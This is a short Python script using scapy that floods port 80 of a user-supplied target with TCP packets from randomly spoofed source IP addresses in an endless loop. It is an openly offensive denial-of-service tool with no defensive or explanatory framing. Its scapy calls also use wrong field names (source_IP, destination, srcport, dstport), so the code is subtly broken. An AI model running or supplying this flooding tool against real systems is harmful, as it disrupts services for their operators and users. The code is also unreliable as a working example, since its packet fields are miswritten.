#!/usr/bin/python3
#taha-shaikhh 
import random
from scapy.all import *

target_ip = input("Enter the ip address of the target ")
i = 1

while True:
	a = str(random.randint(1,254))
	b = str(random.randint(1,254))
	c = str(random.randint(1,254))
	d = str(random.randint(1,254))
	dot = "."
	
	source_IP = a + dot + b + dot + c + dot + d
	
	for soucre_port in range(1,65535):
		IP1 = IP(source_IP = source_IP, destination = target_ip)
		TCP1 = TCP(srcport = soucre_port, dstport = 80)
		pkt = IP1/TCP1
		send (pkt,)
		print ("packet sent ", i)
		i = i + 1 
	